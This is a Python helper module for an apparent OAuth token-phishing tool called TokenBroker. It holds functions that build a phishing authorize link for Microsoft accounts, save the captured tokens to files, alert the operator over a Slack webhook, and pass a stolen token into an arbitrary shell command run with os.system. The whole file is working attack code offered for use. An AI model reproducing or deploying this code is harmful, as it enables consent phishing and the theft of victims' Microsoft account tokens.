#!/usr/bin/python3
 
import os
import json
import time
import requests
from urllib.parse import urlencode
from termcolor import cprint
 
def banner() -> None:
    CRED = '\033[91m'
    ENDC = '\033[0m'
 
    banner_text = '''
    {0}
      _____ _____ _   __ _____ _   _ ______           _             
 |_   _|  _  | | / /|  ___| \ | || ___ \         | |            
   | | | | | | |/ / | |__ |  \| || |_/ /_ __ ___ | | _____ _ __ 
   | | | | | |    \ |  __|| . ` || ___ \ '__/ _ \| |/ / _ \ '__|
   | | \ \_/ / |\  \| |___| |\  || |_/ / | | (_) |   <  __/ |   
   \_/  \___/\_| \_/\____/\_| \_/\____/|_|  \___/|_|\_\___|_|   
    {1}                                                         
    '''.format(CRED, ENDC)
    print(banner_text)
 
def print_error(message) -> None:
    message = "[-] %s" % message
    cprint(message, "red")
 
 
def print_info(message) -> None:
    message = "[!] %s" % message
    cprint(message, "yellow")
 
def print_success(message) -> None:
    message = "[+] %s" % message
    cprint(message, "green")
 
 
def save_token_to_file(token) -> None:
    time_and_date = time.strftime("%M-%H-%d-%m-%Y")
    file_name = "auth-%s.json" % time_and_date
    try:
        f = open(file_name, "w")
        f.write(token)
        f.close()
        print_success("Token saved to %s successfully" % file_name)
    except:
        print_error("Error while writing token file")
 
 
def take_action_after_token(command, token) -> None:
    if command == "":
        print_info("Can't find a command to execute")
        print_info("Exiting ..")
        exit()
    else:
        print_success("Found a command to execute after token retrieval")
        if "TOKENTOKEN" in command:
            print_success("TOKENTOKEN found in command, Executing ..")
            print_success(command)
            command = command.replace("TOKENTOKEN", token)
            os.system(command)
 
 
def check_if_valid_file(file_path) -> bool:
    if os.path.exists(file_path):
        return True
    else:
        return False
 
def create_phishing_link(CLIENTID, SCOPES, REDIRECTURL, AUTHORITY_URL) -> str:
    
    params = urlencode(
        {'response_type': 'code',
        'client_id': CLIENTID,
        'scope': SCOPES,
        'redirect_uri': REDIRECTURL,
        'response_mode': 'query'})
    return AUTHORITY_URL + '/oauth2/authorize?' + params
 
 
def send_notification_to_slack(slack_url) -> None:
    if slack_url == "":
        print_info("Can't find a valid SLACK_URL")
        print_info("No Slack notification will be sent")
    else:
        data = {
                "text": "New Microsoft token retreived, check your TokenBroker instance!"
            }
        data_to_send = json.dumps(data)
        headers = {'Content-Type': 'application/json'}

        req = requests.post(slack_url, data=data_to_send, headers=headers)
        status_code = req.status_code
        response = req.text
        if status_code == 200:
            print_success("Slack notification sent!")
        else:
            print_error("Failed to send message to slack: %s %s" % (str(status_code), response))
